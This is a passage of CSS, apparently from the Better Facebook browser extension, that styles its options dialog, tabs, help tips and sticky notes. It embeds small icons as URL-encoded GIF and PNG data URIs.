F%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF!%F9%04%01%00%00%00%00%2C%00%00%00%00%10%00%10%00%00%08%BD%00%01%08%1CH%B0%A0A%00%3Aj%A4%B0qp%60%8D*%5B%C0%80%F1%C2%C4%C5A%22%5B%AC%E4%E8%D0!G%15-7%0A%D6%D8rDB%10%2F%60%B8%9C0%A2e%04%C1*N(%C4%00%83%E4%04%12%2F%13%8A%24%19%F8bK%0E%09%1D%828X%D0%02%CC%06%12%5BB%08%14%01%A6%83%83%A7%0ALl%A9b%E0%00%18%08%02-%80%91%E0%40A%82%0F%60%8A%20%08%60%15%2B%00%0F%5E%60%24X%8B%03%0C%81%00%022h%B90%B0%0A%93%04%03%08h%C0%11%A0%EF%10%25%04%5Dh%E1%3B%E0%07%98%BE%82Q%14%C4%A1%A5H%06%04%07%2C%10%C9%C2%E2%E0%88%24Z%24j%91%B2%A2%A1%C0%08%10.%60%F0Lz%60%40%00%00%3B") no-repeat left center; }\n	#bfb_option_container .bfb_help { cursor:pointer; display:inline; float:right; width:16px; height:16px; }\n	.bfb_helptext { display:none; z-index:99999; position:absolute; max-width:500px; padding:3px 15px 3px 3px; font-size:13px; -moz-border-radius:5px; border-radius:5px; -moz-border-radius:5px; background-color:white; border:2px solid #880000; -moz-box-shadow:5px 5px 5px #999; -webkit-box-shadow:5px 5px 5px #999; }\n	#bfb_button_help input { padding-left:20px; }\n	\n	/* Position of Facebook\'s "close" X */\n	.bfb_processed .hideSelector, .bfb_processed .hideButton { margin-top:-10px; }\n	.profile .bfb_processed .hideSelector, .bfb_processed .hideButton { margin-top:-6px; }\n	.UIRecentActivityStory .hideSelector, .UIRecentActivityStory .hideButton ,\n	.uiStreamMinistory .hideSelector, .uiStreamMinistory .hideButton, \n	.UIRecentActivityStory .hideSelector, .UIRecentActivityStory .hideButton\n		{ margin-top:-1px; }\n\n	/* Select All button in events */\n	#sfx_select_all_friends { margin-right:10px;}\n	\n	/* Data-loading iframe */\n	.bfb_iframe { position:absolute; height:200px; width:200px; z-index:-5000; visibility:hidden; }\n\n	/* Options Display */\n	.GM_options_wrapper { display:none; position:fixed; top:10px; left:10px; background-color:transparent; z-index:5000;}\n	.GM_options_wrapper_inner { background-color:white; border:5px solid #A7B4D1; -moz-border-radius: 15px; -webkit-border-radius: 15px; border-radius: 15px; padding:10px; z-index:5001; font-size:110%; -moz-box-shadow:10px 10px 10px #999; -webkit-box-shadow:10px 10px 10px #999; }\n	.GM_options_wrapper h2 { font-size:14px; background-color:#3B5998; color:white; font-weight:bold; font-style:italic; padding:1px 10px; margin:0px; }\n	.GM_options_header { background-color:white; color:#3B5998; min-height:55px; }\n	.GM_options_header a { color:#3B5998; }\n	.GM_options_message { clear:both; background-color:yellow; padding:10px; border:1px solid black; -moz-border-radius: 10px; -webkit-border-radius: 10px; border-radius: 10px; margin:10px; font-weight:bold; font-size:larger; }\n	.GM_options_wrapper table.GM_options { border:1px solid #999; border-collapse:collapse; width:100%; }\n	.GM_options_wrapper td.label, .GM_options_wrapper td.input, .GM_options_wrapper td.html  { border:1px solid #999; margin:0px; padding:0px; }\n	.GM_options_wrapper td.label { padding:0px 5px; }\n	.GM_options_buttons { float:right; width:200px; height:50px; vertical-align:middle; text-align:center; }\n	.GM_options_buttons input { background-color:#3B5998; color:white; font-size:24px; font-weight:bold; }\n\n	/* Options dropdown */\n	#bfb_options_button_li {position:relative !important;z-index:4 !important;}\n	#bfb_options_button_li a { \n		display:block !important;\n		font-weight:normal !important;\n	}\n	#bfb_badge_count { line-height:11px !important; }\n\n	/* Options Popup */\n	#bfb_option_container input[type=checkbox] { width:12px; height:12px; } \n\n	#bfb_options_title {\n		font-size:18px;\n		font-family:arial;\n		font-weight:bold;\n	}\n	#bfb_option_container .option {\n		display:none;\n		border:1px solid #ccc;\n		margin:0;\n		padding:3px;\n		margin-top:-1px;\n		background-color:white;\n	}\n	#bfb_option_container .option:nth-child(even) { \n		background-color:#F6F6F6; \n	}\n	#bfb_option_container .option:hover:not(.no_hover) {\n		background-color:#FEE9BE;\n	}\n/*\n	#bfb_option_container div.no_hover:hover {\n		background-color:white !important;\n	}\n	#bfb_option_container div.no_hover:nth-child(even):hover {\n		background-color:#F6F6F6 !important; \n	}\n*/\n	#bfb_option_container .option.tab_popular {\n		display:block;\n	}\n	#bfb_option_container .tab_list {\n		float:left;\n		width:225x;\n		overflow:auto;\n	}\n	#bfb_option_container .tab_list .bfb_tab_selector {\n		font-size:14px;\n		padding:3px 5px;\n		display:block;\n		font-weight:bold;\n		font-family:arial;\n		cursor:pointer;\n		border-bottom:1px solid #ccc;\n		border-right: 1px solid #ccc;\n		margin-right:0px;\n		background-color:#eee;\n	}\n	#bfb_option_container .tab_list .bfb_tab_search {\n		background-color:#eee;\n		font-family:arial;\n		line-height:28px;\n	}\n	#bfb_option_container .tab_list .bfb_tab_search input {\n		width:150px;\n	}\n	#bfb_option_container .tab_list .bfb_tab_selector:hover {\n		background: #ccc url("data:image/gif,GIF89a%0D%00%09%00%80%01%00%99%99%99%FF%FF%FF!%FE%15Created%20with%20The%20GIMP%00!%F9%04%01%0A%00%01%00%2C%00%00%00%00%0D%00%09%00%00%02%15%84%83%06%C8%DA%C7%82K%F0-z%AD%C6%5B%D6%E9e%E0X%05%05%00%3B") no-repeat right center;\n	}\n	#bfb_option_container .tab_list .bfb_tab_selected {\n		padding-left:20px;\n		background: white url("data:image/gif,GIF89a%0D%00%09%00%80%01%00%99%99%99%FF%FF%FF!%FE%15Created%20with%20The%20GIMP%00!%F9%04%01%0A%00%01%00%2C%00%00%00%00%0D%00%09%00%00%02%15%84%83%06%C8%DA%C7%82K%F0-z%AD%C6%5B%D6%E9e%E0X%05%05%00%3B") no-repeat right center;\n		border-right:none;\n	}\n	#bfb_option_container .tab_list .bfb_tab_selected:hover {\n		background-color:white;\n	}\n	#bfb_option_container .content {\n		overflow:auto;\n		border:1px solid #ccc;\n		padding:10px;\n		margin-left:0px;\n		border-left:none;\n	}\n\n	/* Shrink the search input a bit to make sure there is room for the wrench icon */\n	#navSearch .uiSearchInput input { width: 290px !important; }\n	#navSearch { width: 325px !important; }\n\n	#bfb_tracelog, #bfb_user_prefs { font-family:courier new; font-size:12px; height:300px;overflow:auto;border:1px solid #ccc;background-color:white; }\n	#bfb_user_prefs { width:600px; white-space:pre; }\n	select.bfb_disabled { background-color:#eee; color:#ccc; }\n	.bfb_options_minimized .bfb_options_minimized_hide { display:none; }\n	.bfb_options_minimized { width:auto !important; }\n	.bfb_sub_option { margin-left:15px; }\n	\n	.bfb_featured_option { border:2px solid #3B5998;-moz-border-radius:5px;-webkit-border-radius:5px;border-radius:5px;padding:2px;background-color:white;width:90px;text-align:center;float:left;height:150px; margin:5px 3px !important; }\n	.bfb_featured_option:hover { border-color:#880000; cursor:pointer; }\n	.bfb_featured_option .desc { text-align:left; font-size:11px; border-top:1px solid #333; }\n	.bfb_options_simple_mode .bfb_option_advanced { display:none; }\n\n	/* Tabs */\n	.bfb_tabs {\n	}\n	.bfb_tabs > .bfb_tab:first-child {\n		border-left:1px solid #999;\n	}\n	.bfb_tabs > .bfb_tab {\n		border-top:1px solid #999;\n		border-right: 1px solid #999;\n		border-bottom:1px solid #999;\n		background-color:#D8DFEA;\n		font-weight:bold;\n		color:#565656;\n		display:inline-block;\n		margin-right:0;\n		padding:2px 4px 2px 4px;\n		z-index:1;\n		cursor:pointer;\n		border-top-left-radius:3px;\n		border-top-right-radius:3px;\n		-moz-border-top-left-radius:3px;\n		-moz-border-top-right-radius:3px;\n		-webkit-border-top-left-radius:3px;\n		-webkit-border-top-right-radius:3px;\n		-opera-border-top-left-radius:3px;\n		-opera-border-top-right-radius:3px;\n	}\n	.bfb_tabs > .bfb_tab:hover {\n		background-color:#EFF2F7;\n	}\n	.bfb_tabs > .bfb_tab_selected {\n		background-color:#ffffff;\n		color:#333333;\n		border:1px solid #3B5998 !important;\n		border-bottom:none !important;\n	}\n	.bfb_tabs > .bfb_tab_selected:hover {\n		background-color:#fff !important;\n	}\n\n	/* Feed Tabs */\n	.bfb_tab_count { \n		margin-left:6px;\n		font-size:85%;\n		font-weight:normal;\n		color:#757575 !important;\n	}\n	.bfb_tab_count .new { font-weight:bold; }\n	.bfb_tab_count .total {  }\n	.bfb_tab_empty .name, .bfb_tab_empty .bfb_tab_count { \n		opacity:.5;\n	}\n	.bfb_tab_empty.bfb_tab_selected .name, .bfb_tab_empty.bfb_tab_selected .bfb_tab_count { \n		opacity:1;\n	}\n	.bfb_tab .bfb_tab_close { display:none; float:right; position:relative; margin-left:-5px; top:0px; left:5px; cursor:pointer; width:11px; height:11px; background:transparent url("data:image/gif,GIF89a%0B%00%0B%00%91%00%00%00%00%00%FF%FF%FF%9C%9A%9C%FF%FF%FF!%F9%04%01%00%00%03%00%2C%00%00%00%00%0B%00%0B%00%00%02%18%94%8F6%CB%AC%BA%9E%18%87%CA%88%B0%83%16%D7%5E%85%13w5M%82%0A%05%00%3B") no-repeat left center; }\n	.bfb_tab_selected .bfb_tab_close { display:block; }\n	.bfb_tab .bfb_tab_close:hover { -moz-box-shadow:0 0 4px red; -webkit-box-shadow:0 0 4px red; box-shadow:0 0 4px red; }\n	/* Fix for first story being shifted right when tabs exist */\n	.uiStreamStory { margin-top: 2px !important; }\n	\n	/* Dialog */\n	.bfb_dialog { position:fixed; background-color:#FFFDEA; width:600px; top:50px; left:10px; z-index:9999; padding:5px; \n					font-family:arial; font-size:14px; -moz-box-shadow:12px 12px 15px #666; -webkit-box-shadow:5px 5px 5px #999;\n					border:4px solid #F4D307; -moz-border-radius:8px; -webkit-border-radius: 8px; border-radius: 8px; }\n	.bfb_dialog_header { font-size:16px; font-weight:bold; }\n	.bfb_dialog_content { margin:5px 10px 0px 10px; }\n	.bfb_dialog_footer { margin:15px 0px; text-align:center; }\n	.bfb_dialog_footer .UIButton_better_fb { padding:5px !important; }\n\n	/* Mini "x" icon to close */\n	.better_fb_mini_message, .mini_x { background-image:url("data:image/gif,GIF89a%0B%00%0D%00%F7%00%00%9C%9A%9C%FC%FE%FC%00%00%12%00%00%00%60%94%00%23%E9%D0%00%12%FD%00%00%7F)%00%80!%D0%EA%00%FD%12%00%7F%00%00J%04%00%F8%26%15A%83%00~%7C%12%00J%00%00%F8%00%00A%00%00~%00%00%00%02%00%00%00%00%00%00%00%00%00%94%00%03%E9%00%00%12%00%00%00%00%D8%FC%98%E8%05%EA%12%07%12%00%00%00%F9%F6%11%E5%05%01%81%07%00%7C%00%00%00%98%90%00%E9%EA%01%12%7D%00%00%00VJ%AC%00%F8%EA%00A%12%00~%00%E0%00%BE%E7%00c%12%00E%00%00~n%00%00%00%00%00%00%00%0C%00%00%00%00%B0%00%E9%E9%00%12%12%00%00%00%00%20%00%98%E9%00%EA%90%00%12%7C%00%00%60%00%FC%00%D0%84%91%FDA%7C%7F~%FF%C4%A4%FF%E9%85%FF%12A%FF%00~%5D%BE%0E%00c%06%91E%09%7C~%00%95%00%01%E7%00%00%81%0C%00%7C%00%00%00%00%87%00%00%F7%15%00A%00%00~%60%B0%3B%03%E9%04%00%12%D4%00%00%00%10%1AX%BE%7C%D6%1A%80A%00%18~8%00%E4_%00%EA%15%00%12%00%00%00%00%FC%87%00%05%C4%00%07A%00%00~~%00%93%00%00%C4%00%00A%C0%03~%00%11%87%00%01%F7%00%00A%00%00~%FF%F6%3B%FF%05%04%FF%07%D4%FF%00%00%FF%ECX%FF%E9%D6%FF%12A%FF%00~%00%0C%01%00%B5%00%00A%00%00~%00%00%90%BC%00%EA%EA%00%7D%12%00%00%00%00%11%00%00%01%00%15%00%00%00%00%00%A8%00p%FD%00%9E%00%00%80%00%03%7C%10%1C%00%E9%B5%00%12A%00%00~%00%AF%00%00%EB%00%00%81%00%00%7C%00%00Z%00%07%E3%00%00%81%00%00%7C%00%00%40%00%00%B9%00%00P%00%00%00%00%008%00%00_%00%40%01%00%15%00%00%00lD%00%00%EA%00%00%12%00%00%00%00L%A8%00%E8%FD%00%12%00%00%00%00%004(%00%00%EA%00%00%12%00%C0%00%00%AC%CD%00%FB%2B%00%12%83%00%00%7C%00%20%00x%E9%00%9E%90%00%80%7C%00%7C%60%00%FF%00%00%FF%91%00%FF%7C%00%FF%FF%00p%FF%00%9E%FF%00%80%FF%00%7C%5D%00%3D%00%01%00%91%00%00%7C%00%00Z1%3D%F4%2C%00%80%83%00%7C%7C%00%00L%FC%00%EA%F0%15%12%12%00%00%00%00%0C%FF%00%2C%FF%00%83%FF%00%7C%FF8%00%00_%00%00%15%00%00%00%00%00%00%18T%01%00%EB%00%00%12%00%00%00%00%7CF%00d%83%00%83L%00%7C%00g%004%F4%00%EB%80%00%12%7C%00%008Pw%EA%EBP%12%12O%00%00%008%B5h_d%EB%15%83%12%00%7C%00%00%D4%7C%00ld%0CO%83%00%00%7C%00%E0%25%00w%ED%00O%12%00%00%00%B0%00%C1%E9%01%FF%12%00%FF%00%00%7F%7CL%E8%E9%EA%EC%12%12%12%00%00%00%86%00%00%7D%01%00%80%00%00%18%00%00%CB%D0%7C%00dd%05%83%83%00%7C%7C%00%01%00%00%00%00%00%00%00%00%00%00%00%00%A8%00%00%FD%00%00%00%00%00%00%B0%00p%E9%00H%12%00%15%00%00%00%00%00%01%D0%00-%FD%00H%7F%00%00!%F9%04%00%00%00%00%00%2C%00%00%00%00%0B%00%0D%00%07%08)%00%03%08%1CH%B0%A0%C1%83%07%01%00%18%A8%90%A0%C2%85%0F%0B%3Elh0b%C5%89%12%1BZ%14H1%40G%84%20C%16%0C%08%00%3B"); }\n	.better_fb_mini_message:hover, .mini_x:hover { background-image:url("data:image/gif,GIF89a%0B%00%0D%00%F7%00%00%3CZ%9C%FC%FE%FC%00%00%12%00%00%00%60%94%00%23%E9%D0%00%12%FD%00%00%7F!%00%80!%D0%EA%00%FD%12%00%7F%00%00J%04%00%F8%26%15A%83%00~%7C%12%00J%00%00%F8%00%00A%00%00~%00%00%00%02%00%00%00%00%00%00%00%00%00%94%00%03%E9%00%00%12%00%00%00%00%D8%DE%98%E8%06%EA%12%0F%12%00%00%00%F9%A2%11%E5%07%01%81%18%00%7C%00%00%00%98%B8%00%E9%DF%01%12%81%00%00%00VJ%AC%00%F8%EA%00A%12%00~%00%E0%00%BE%E7%00c%12%00E%00%00~n%00%00%00%00%00%00%00%0C%00%00%00%00%B0%00%E9%E9%00%12%12%00%00%00%00%20%00%98%E9%00%EA%90%00%12%7C%00%00%60%00%FC%00%D0%84%91%FDA%7C%7F~%FF%C4%A4%FF%E9%85%FF%12A%FF%00~%5D%BE%AE%00c%07%91E%0E%7C~%00%95%00%01%E7%00%00%81%0C%00%7C%00%00%00%00%87%00%00%F7%15%00A%00%00~%60%B0%0F%03%E9%08%00%12%24%00%00%00%40%1AX2%7C%D6!%80A%00%18~8%00%E4_%00%EA%15%00%12%00%00%00%00%DE%87%00%06%C4%00%0FA%00%00~~%00%93%00%00%C4%00%00A%C0%03~%00%11%87%00%01%F7%00%00A%00%00~%FF%A2%0F%FF%07%08%FF%18%24%FF%00%00%FF%ECX%FF%E9%D6%FF%12A%FF%00~%00%0C%01%00%B5%00%00A%00%00~%00%00%B8%BC%00%DF%EA%00%81%12%00%00%00%00%11%00%00%01%00%15%00%00%00%00%00%24%00p%7D%00%9E%00%00%80%00%03%7C%10%1C%00%E9%B5%00%12A%00%00~%00%AF%00%00%EB%00%00%81%00%00%7C%00%00Z%00%07%E3%00%00%81%00%00%7C%00%00%40%00%00%B9%00%00P%00%00%00%00%008%00%00_%00%40%01%00%15%00%00%00lD%00%00%EA%00%00%12%00%00%00%00L%24%00%E8%7D%00%12%00%00%00%00%004(%00%00%EA%00%00%12%00%C0%00%00%AC%CD%00%FB%2B%00%12%83%00%00%7C%00%20%00x%E9%00%9E%90%00%80%7C%00%7C%60%00%FF%00%00%FF%91%00%FF%7C%00%FF%FF%00p%FF%00%9E%FF%00%80%FF%00%7C%5D%00%3B%00%01%00%91%00%00%7C%00%00Z1%3B%F4%2C%00%80%83%00%7C%7C%00%00L%FC%00%EA%F0%15%12%12%00%00%00%00%0C%FF%00%2C%FF%00%83%FF%00%7C%FF8%00%00_%00%00%15%00%00%00%00%00%00%18T%01%00%EB%00%00%12%00%00%00%00%7CF%00d%83%00%83L%00%7C%00g%004%F4%00%EB%80%00%12%7C%00%008Pw%EA%EBP%12%12O%00%00%008%B5h_d%EB%15%83%12%00%7C%00%00%D4%7C%00ld%0CO%83%00%00%7C%00%E0%23%00w%ED%00O%12%00%00%00%B0%00%C3%E9%01%FF%12%00%FF%00%00%7F%7CL%E8%E9%EA%EC%12%12%12%00%00%00%86%00%00%7D%01%00%80%00%00%18%00%00%D9%D0%7C%00dd%06%83%83%00%7C%7C%00%01%00%00%00%00%00%00%00%00%00%00%00%00%24%00%00%7D%00%00%00%00%00%00%B0%00p%E9%00H%12%00%15%00%00%00%00%00%01%D0%00-%FD%00H%7F%00%00!%F9%04%00%00%00%00%00%2C%00%00%00%00%0B%00%0D%00%07%08)%00%01%08%1CH%B0%A0%C1%83%07%03%04%18%A8%90%A0%C2%85%0F%0B%3Elh0b%C5%89%12%1BZ%14H%11%40G%84%20C%16%0C%08%00%3B"); }\n	.better_fb_mini_message, .mini_x {  background-repeat:no-repeat; background-position:top right; cursor:pointer; }\n\n	/* Messages, Tips */\n	.better_fb_mini_message, .sfx_mini_message_no_x { padding:1px 10px 1px 2px; background-color:#FFFDEA; font-family:arial; font-size:10px;font-weight:bold; margin:1px; border:2px solid #F4D307; -moz-border-radius:3px; -webkit-border-radius: 3px; border-radius: 3px; }\n	.better_fb_message { clear:both; background-image:url("data:image/png,%89PNG%0D%0A%1A%0A%00%00%00%0DIHDR%00%00%00%23%00%00%00%23%08%02%00%00%00%91%BB%24%0E%00%00%00%06tRNS%00%00%00%00%00%00n%A6%07%91%00%00%00%09pHYs%00%00%0B%13%00%00%0B%13%01%00%9A%9C%18%00%00%06.IDATx%DA%E5%97%5Dl%DB%D6%15%C7%FF%A4%24J%B2d%C9%96%AA%C5%8A%12%3B%8E%5D%E7s%C1%92eu%8B%A4S%8B%C6Y%DD%06%CD%87%8B%3C%04%5B%83%3E5%D8V%EC%E3%A1%F0C%91%01%1D0l%E8%B0%97%14%E9%8A%AC%40%1E%16%17k%96%B5%CD%86%B9M%D6%C0%CE%9C%CD%AE%5D\'UmGql%CB%B2%ADY%1F%96%25J%A4H%5E%92%F7%EEAN%90%D5%5Em%A7%C1%5E%F6%7F%22.%0F%CF%8F%FF%83s%EF!%81%FF%95%B8%95%87%8E%0Fv%C5%23%03%F3%B3%09R%92%84%0A%B7%CB%5B%B9%A6~%7B%C3%EE%C7%BD%81%E0%83!%A9R%F1%FAG%E7%BA%3B%CE%24%A2%11%00N%B7%DDQa\'%84W%8A%25j%12O%20%B4%F3%3B%87%F7%1E%FBAM%5D%E3W%22M%0D%F5w%FC%ECD%22%1A%F1%04B%E1%A3%5B%EAv%B4%F8BM%8E%0A%AF%AE%5Bsi-%1D%8B%96%DF%C0%13%08%1Dx%B9%FD%B1%B6%13%F7Y%D9%A1%AE%3F%B7%EF%09%BC%D2%EC%EE%3C%7DRM%7F%C8%A8%C8%BE%20*S%7D%F8%9F%17~%FB%FAa%DF%8Fv%B8%3AO%9F%BC%1F%CCd%A4%B7%7DO%E0%E4%93%FE%5B%3D%BF%A1%FA03%A6%18%15%19%95%17%C1DF%C5%5C%E2%FC%A9%176%BC%BC%CDv%E5%EC%AFW%87Q%A5%E2%2F%DB%BE%F9J%B3%FBVw%3BcW%A8%DA%C7%CC4%A32c%84-!%C2%A8H%E6%DEx%FD%B0%AF%7DO%602%D2%BBdN~%C9%D5%7F%FC%F1%ADD4%B2%EF%F8%E3%0F7%D71%0D%9C%B5%DC%5D%06%00%40%FFb4%D3%01%D8%7C%DF%7B%FE%C7%B5J%B1%F4%D73%BFX)I%16%E7%BB%3B%DE%AEm%AA%7Cl_%08%E6%3A%C0%C5%18%01S%EF%26%BD%03%BB%07%C94%00u%CD%2F%3D%F247%DA%D35%3E%D8%B5%22R%EC%FA51%93%D8%FC%A8%C7%B5%A6%1A%00%A0%01%1Ac%04L%03%8CE%B0%3B%3C*r%F6M%FB%9F%A9d%A6y%FD%A3%0F%16%A7%B5.%5E%9A%1E%E9%07%B0%F9%EB%B5%8CV%82%8A%1C%00%D8a%C1%82-%0E%60%E5%0Db%BB%E3%D2(%DFb%1A%7C%5B%D6z%FDdl%E0%EA%8A%3C%E5fg%3DU%B6%AAj%C1%24%C4%D4%F2%8C%8A%80%0C%AA-%D4%B0%EC%0C%06%98%B2%E0%8F%8A%8C%11%C6%8A0e%00k%B7%98J%B1%24ff%97%F7%94%CF%A7%EET_%E4%E1%06%AA%60%CA%B0XA%C1x%CF%7Fnu%0D%00c%C4%24%BC%C5%22%19J%DC%02T%BA%8DIyN)%C9%CB%93%9C%82%BB%7CA%F23B%B5%97%D7f%60%07%07%C0%02P0%DE%0EF8N%00%E7%00g%07%E7%A4%B4%1A%98%26%85%9C%60%8FC%89%14%25%97%C5%E6rV%B8%96%AF%5E%E5Ck%D4%92%96%CF%11%00T%8DQSZ%A8%A1)%82%E5aJ%00%C0%FB%C1%07%00%2Bh%9E%91iUJ%F0%FC%18S%AFh%12W%9C%E5%2B%FD~%AB%60_%DES%A8i%93%A6%B0%B9X%3A%B8%D1o(%25%2Bb%BC%03L%93%60%07g%0Dq%B6%06%00%A0Yf%0C%C1LS%26%98%25%86%92%88%8A%24G%22b%9E%CF%A6-%B5%BBB.%AFoyR%FD%EE%7D%CE%CA%8A%81%3E%B5qW%D1%EAp%00%25%A6%25y%A1%CE%EE%080%3D%C3%1B%09F%C5%BB%C1T%CB%EBr%80%EA%19*%9D%85%80%DB%83%D5J%B1%B8%F3%89gp%EA%E2%F2%D5%AB%A9k%DC%F4h%CB%F8%E7%F3c%833%86%AA%EA%8An%C8I%AD%A0%15%26%FE%AE%CD%7DbH%7D0%26%60L%98%A5%A8)%F7%E9R%8E%EA%19*%7F%C8HZ%93%B8%1B%7D%8E%AA%9A%DA%AD%DF%3E%B8%A2%FD%04%E0%A9%17%7Fr%B3%E7b%CF%DF%D2%EBjy%C1%E9%B4%BA(%EF%00%91*L%E5!%00%8Ejb%B3%2B%0B%9E%88%22O%8D%D8%5D%098%F0%AF%09%F7%F4%AD%B9-%7B%9F%5Br6.%7D%EE%D5n%FF%D6%93%C7%7F%3A3%AE%BD%7F%BED%14E%2F%E8%24%3Bk%B5%DE%06%1D%D5%8B%B9%E2%94%AC%CC%8B%864D%B2%97%D5%EC%A4%C5n%02%D0%95*1c\'%84%AFih%5C%C5%09%0B%A0%F5%FB%AF5%1F%3C6%FAi%E2%FD%F3%A5B%862%BD%A8%CE%17uq%9Ci%FDR%F2%B3%B9%1BS%E9%D1%92V%B0%94%83%0D%A9%A4%15%2C%B2%CC%98i%DA%2B%3C%AB%23%018%F6%F33%E1%EF%FEp%ECF%E6%F7o%A7%AEu%99rN%E0%99%0D%80%D5%A53%9BA%92%AE%DCL55%7C%00%88j1%95J%2B%AA%BE%24%9B%E5%CB%07%D5%BB%1F%F7%BEy%F6%DC%D4%CD%E1%E1%BE%C9%A1%88nR%A1%AE%C1i%B5p%16%81%A3%84S%E7%AC%BCi%DA%BC.%0BW%D4%09-%88l%F8%86l%04%B7uv%F5%AC%B4%23%EE%D5%AE%D6%A3%00%06%3B%DF%BD%F4%BB_%5D%ED%8C%025%7B%5B%AA%04%1B%84%F50U%B3%98%CC%DB%D7%04e%E2%8A%8Ed%13%F1%FC%07b%20%3C%99%5E2%8Fu%85SxW%EBQ13%7B%EE%B5%97%AEv~%2C%F8%CCmM%B6%E1Q%3D%11%CF%EF%0D%85%B4%D4lLtM%CF%ECp%EC%3E%B4%7D%EABwww2%3E%B6%F8S%C9%BA%F2%91%EF%0D%04%C5%CC%EC%9B\'%0E%5C%BB8%F5%07w%AE%BC%A8K%F2%E4%CD%60%D6%16%DC%DF%D2r%E8%E0s%C9Tjh%24z%E1%2F%97%EE%DF%D3%5DXG%C7%3Bo%BD%FA%EA%F6%AD%8Fl%DA%BC%15%40%CA%E9%0AVy%B7U%7BUU%B95z%7BC%DD%06%00%FD%03%03%AB%EB%BD%25%F5l%CB%13%A1u%EBs%85%85%A1%A0*r%3E%2F%26S%A9d*%95H%24%3C%1E%CF%7F%7Bp%D5%24o%20%D8%D8%B0113%0D%C0%E7%F7%F9%FC%BE%60%CD%D7%BC%1E%AF%208%E2%F1xo_%3F%80%A6%A6%87%1F%00%09%C0%FE%96%16%00%BD%9F%F4%CFg%E7%E7%B3%F3%B1X%2C%16%8B%01p%3A%1D%9F%5D%EF%07%D0%FAt%EB%83!%B5%1D9%14%0E%87%133%D3s%D9%AC%CF%EF%AB%09%AE%AD%AF%AF\'D%7D%EFO%17%86F%A2mG%8E%EC%DC%F9%8D%AF%F4%AFq%AF%E6%B2%D9%17%8F%BF04%12%05%10Z%B7%BE%5CL%00%E1p%F8%F4%1B%A7*%5C%AE%07F*%AB%A3%E3%9DK%97%2F%8F%8DO%00hl%D8%F8%7C%5B%DB%81%03%CF%E2%FFH%FF%06%DB%01b%5BR%10nj%00%00%00%00IEND%AEB%60%82"); min-height:40px; background-repeat:no-repeat; background-position:-4px 0px; background-color:#FFFDEA; padding:2px; font-family:arial; font-size:12px; margin:2px; border:2px solid #F4D307; -moz-border-radius:8px; -webkit-border-radius: 8px; border-radius: 8px; }\n	.better_fb_message a { text-decoration:underline; }\n	.better_fb_bulb_spacer { float:left; width:32px; height:30px; }\n	.better_fb_close { background-color:#3B5998; color:white; border:3px solid white; border-color:#ddd #999 #999 #ddd; text-align:center; -moz-border-radius:10px; -webkit-border-radius:10px; border-radius:10px; font-size:16px; cursor:pointer; margin:5px 10px; padding:5px 20px; }\n	.better_fb_close:hover { background-color:white; color:#3B5998; }\n	.bfb_close_wrap { clear:both; text-align:center; line-height:32px; }\n	.bfb_update { background:none repeat scroll 0 0 #FFF8CC; border-bottom:1px solid #FFE222; color:#000000; padding:0 0 1px; font-size:11px; margin:1px 0px 10px 5px; }\n	.bfb_h4 { margin-top:7px;}\n\n	/* "Sticky" note */\n	.bfb_sticky_note {\n	  position:absolute;\n	  min-height:14px;\n	  min-width:100px;\n	  right:100%;\n	  margin-right:8px;\n	  top:50%;\n	  font-family:arial;\n	  background-color:#ffa;\n	  color:black;\n	  border:1px solid #666666;\n	  font-size:12px;\n	  padding:3px;\n	  text-align:center;\n	  border-radius:6px;-moz-border-radius:6px;-webkit-border-radius:6px;\n	  box-shadow:0 0 5px #888888;-moz-box-shadow:0 0 5px #888888;-webkit-box-shadow:0 0 5px #888888;\n	  z-index:999999;\n	}\n	.bfb_sticky_note_right {left:100%;right:auto;margin-left:8px;margin-right:auto;}\n	.bfb_sticky_note_left {right:100%;left:auto;margin-right:8px;margin-left:auto;}\n\n	.bfb_sticky_note_arrow_border {\n	  border-color: transparent transparent transparent #666666;\n	  border-style: solid;\n	  border-width: 7px;\n	  height:0; width:0;\n	  position:absolute;\n	  margin-top:-7px;\n	  top:50%;\n	  right:-15px;\n	}\n	.bfb_sticky_note_right .bfb_sticky_note_arrow_border {border-color: transparent #666666 transparent transparent;top:50%;right:auto;left:-15px;}\n	.bfb_sticky_note_left .bfb_sticky_note_arrow_border {border-color: transparent transparent transparent #666666;top:50%;right:-15px;left:auto;}\n\n	.bfb_sticky_note_arrow {\n	  border-color: transparent transparent transparent #ffa;\n	  border-style: solid;\n	  border-width: 7px;\n	  height:0; width:0;\n	  position:absolute;\n	  top:50%;\n	  right:-13px;\n	  margin-top:-7px;\n	}\n	.bfb_sticky_note_right .bfb_sticky_note_arrow {border-color: transparent #ffa transparent transparent;top:50%;right:auto;left:-13px;}\n	.bfb_sticky_note_left .bfb_sticky_note_arrow {border-color: transparent transparent transparent #ffa;top:50%;right:-13px;left:auto;}\n\n	.bfb_sticky_note_close {\n		float:left;\n		width:9px;\n		height:9px;\n		background-repeat:no-repeat; \n		background-position:center center; \n		cursor:pointer;\n		background-image:url("data:image/gif,GIF89a%07%00%07%00%91%00%00%00%00%00%FF%FF%FF%9C%9A%9C%FF%FF%FF!%F9%04%01%00%00%03%00%2C%00%00%00%00%07%00%07%00%00%02%0C%94%86%A6%B3j%C8%5Er%F1%B83%0B%00%3B");\n		border:1px solid transparent;\n	}\n	.bfb_sticky_note_right 